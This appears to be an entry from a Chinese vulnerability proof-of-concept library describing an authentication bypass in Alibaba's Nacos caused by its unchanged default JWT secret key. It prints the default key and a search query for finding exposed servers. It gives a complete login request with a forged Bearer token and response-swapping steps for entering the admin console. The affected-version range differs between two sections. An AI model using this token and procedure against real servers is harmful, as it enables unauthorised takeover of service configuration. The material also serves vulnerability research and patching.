---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# Nacos默认key导致权限绕过登陆漏洞

# 一、漏洞简介
<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</font><font style="color:rgba(0, 0, 0, 0.9);">Nacos中发现影响Nacos <= 2.1.0的问题，</font><font style="color:rgb(51, 51, 51);">nacos在默认情况下未对token.secret.key进行修改，导致攻击者可以绕过密钥认证进入后台。</font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">0.1.0 <= Nacos <= 2.2.0</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ 特征


# 四、漏洞复现
1. <font style="color:rgb(51, 51, 51);">Nacos的token.secret.key值是固定死的</font>

```plain
nacos/conf/application.properties   //位于该文件中

SecretKey012345678901234567890123456789012345678901234567890123456789
```

2. 构造JWT


3. <font style="color:rgb(51, 51, 51);">构造数据包获取accesstoken</font>

```plain
POST /nacos/v1/auth/users/login HTTP/1.1
Host: 
Content-Length: 28
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA3MDk1MzY0M30.XPfd1WnNHqQdu5-D734ishsizYCEbsQG7mVwdm4MyWg
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=nacos&password=1111
```


4. 登录系统

<font style="color:rgb(51, 51, 51);">将返回包内容全部复制，然后在登陆时抓包，拦截返回包替换，然后发包即可登录后台</font>

<font style="color:rgb(51, 51, 51);">在账号密码错误的情况下返回包为403</font>


<font style="color:rgb(51, 51, 51);">将拦截的返回包替换为之前的返回包内容</font>


<font style="color:rgb(51, 51, 51);">发包之后成功登录后台</font>


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pg7g9r320fwlmxap>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
